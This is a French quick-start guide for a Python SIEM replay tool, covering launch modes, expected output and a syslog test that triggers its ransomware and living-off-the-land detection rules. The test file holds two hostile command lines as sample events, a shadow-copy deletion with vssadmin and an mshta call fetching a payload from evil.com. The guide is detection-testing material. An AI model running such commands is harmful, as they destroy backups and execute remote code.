# Démarrage rapide v2

## Prérequis

- Python 3.10+
- Aucune dépendance externe (stdlib uniquement)
- Windows pour les événements natifs, Linux/macOS pour syslog

## Installation

```bash
# Décompresser SIEM_v2.zip
cd SIEM/
python --version  # >= 3.10
```

## Modes de lancement

=== "JSON (compatible v1)"
    ```bat
    # Windows
    run_siem.bat small
    run_siem.bat large

    # Python direct
    set PYTHONPATH=src
    python -m ingest.replay --input events.jsonl --out-dir out/
    ```

=== "Syslog fichier"
    ```bat
    # Placer le fichier syslog dans syslog/security.log
    run_siem.bat syslog

    # Ou directement
    python -m ingest.replay --format syslog --input C:\logs\security.log --out-dir out\syslog
    ```

=== "Stdin (streaming)"
    ```bash
    # Linux — rsyslog pipe
    tail -f /var/log/syslog | python -m ingest.replay --format syslog --input - --out-dir /out/live

    # Windows — NXLog pipe
    nxlog.exe | python -m ingest.replay --format auto --input - --out-dir C:\siem\out
    ```

=== "Auto-detect"
    ```bash
    # Fichier mixte (JSON + syslog)
    python -m ingest.replay --format auto --input mixed.log --out-dir out/
    ```

## Sortie attendue

```
[*] Enabling audit policy: Process Creation (EventID 4688)...
[*] Enabling CommandLine logging in 4688 events...
[+] Audit policies applied.
[*] Running SIEM replay
[*] Mode  : large
[*] Format: json
[*] Input : C:\SIEM\events_large.jsonl
[*] Out   : C:\SIEM\out\large

[replay] Format   : json
[replay] Ingested : 243 raw lines -> 243 events
[replay] Signals  : 4
[replay] Alerts   : 1
  -> ALERT_rw_... [critical] conf=0.92  Possible ransomware activity (critical)
```

## Tester avec un événement syslog

Créer un fichier `test.syslog` :

```
<134>1 2024-01-15T12:00:00Z WIN-SRV01 Security 4688 - - {"EventID":4688,"Hostname":"WIN-SRV01","EventData":{"NewProcessName":"C:\\Windows\\System32\\vssadmin.exe","CommandLine":"vssadmin delete shadows /all /quiet","SubjectUserName":"SYSTEM"}}
<134>1 2024-01-15T12:00:05Z WIN-SRV01 Security 4688 - - {"EventID":4688,"Hostname":"WIN-SRV01","EventData":{"NewProcessName":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta.exe http://evil.com/payload.hta","SubjectUserName":"jdoe"}}
```

```bash
python -m ingest.replay --format syslog --input test.syslog --out-dir out/test
```

Résultat attendu :
```
[replay] Ingested : 2 raw lines -> 2 events
[replay] Signals  : 2   (LOTL-001 vssadmin + LOTL-003 mshta)
[replay] Alerts   : 0   (seuil corrélateur non atteint sur ces 2 seuls events)
```

Les signaux apparaissent dans `out/test/signals.jsonl` avec leurs tags MITRE :

```json
{"signal_type": "lotl.LOTL-001", "mitre_tactic": "Impact", "mitre_technique": "T1490", "score": 0.92, ...}
{"signal_type": "lotl.LOTL-003", "mitre_tactic": "Execution", "mitre_technique": "T1218.005", "score": 0.85, ...}
```
